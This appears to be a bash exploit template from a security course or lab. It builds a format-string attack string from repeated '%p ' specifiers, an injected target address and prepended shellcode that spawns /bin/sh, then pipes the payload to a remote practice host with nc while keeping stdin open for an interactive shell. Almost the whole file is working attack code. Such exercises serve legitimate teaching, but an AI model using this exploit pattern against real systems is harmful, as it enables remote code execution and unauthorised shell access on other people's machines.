#!/bin/bash

attackstr=""

# check if first argument is specified
if [ -z "$1" ]; then
    echo "Specify number of bytes to print as $0 <num bytes>" >&2
    exit 1
fi

### Examples useful for shell programming: ##################################
#                                                                           #
## You can assign the output of a shell command to a variable as follows:   #
#                                                                           #
# variable="$(echo bla)"                                                    #
#                                                                           #
## Append a string 'str' to a variable as follows:                          #
#                                                                           #
# variable="${variable}str"                                                 #
#                                                                           #
## Prepend a str 'str' to a variable as follows:                            #
#                                                                           #
# variable="str${variable}"                                                 #
#                                                                           #
#############################################################################


# attackstr="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# attackstr="%u %u %u "

# Print some As (see the $1 in the argument to seq!)
for i in $(seq 1 $1); 
do 
    attackstr="${attackstr}%p "
done
# attackstr="${attackstr}CC$(./reverseaddr 0x123456789ABCDEF)AAAAAAA\x00\x01BC"

# at the end, we inject our desired address obtained from argument 2
if ! [ "$2" = "" ]; then
    attackstr="${attackstr}$(./reverseaddr $2)"
fi

# third argument is padding for our address
if ! [ "$3" = "" ]; then 
        attackstr="$(./shellcode shell $3)${attackstr}"
    # for i in $(seq 0 $3); do
    #    attackstr="A${attackstr}" 
    # done
fi



# this is probably a good place to add some other commands


# **Don't change the next lines** if you don't have to; probably easier to modify attackstr above
# This next echo statement ends with >&2, which is some magic that redirects the output to stderr.
echo "Attackstring is $(echo -n $attackstr | wc -c) bytes" >&2  # print to stderr
# echo $attackstr | nc hackme.rded.nl 57065 # Comment me out if you want to run the /bin/ls shell code (./shellcode list)

# Uncomment if you want to run the /bin/sh shell code (./shellcode shell)
# echo $attackstr
(echo $attackstr; cat -) | nc hackme.rded.nl 60791
## This composed command allows stdin to remain open, which would otherwise have been closed by the EOF sent by echo.
